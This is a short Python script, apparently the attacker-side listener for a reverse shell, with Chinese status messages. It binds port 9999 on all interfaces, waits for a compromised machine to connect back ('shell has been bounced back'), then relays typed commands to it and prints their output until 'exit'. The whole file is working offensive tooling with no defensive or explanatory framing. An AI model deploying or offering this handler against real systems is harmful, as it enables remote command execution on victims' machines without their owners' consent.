import socket
import time


server = ("0.0.0.0", 9999)
s = socket.socket()
s.bind(server)
s.listen(5)
con, addr = s.accept()
print(addr, "shell已反弹回来!")
while 1:
    dir = con.recv(1024).decode()
    cmd = input(dir+":").strip()
    con.send(cmd.encode())
    if cmd == "exit":
        break
    result = con.recv(65365)
    print(result.decode())
    time.sleep(1)
s.close()
print("退出!")
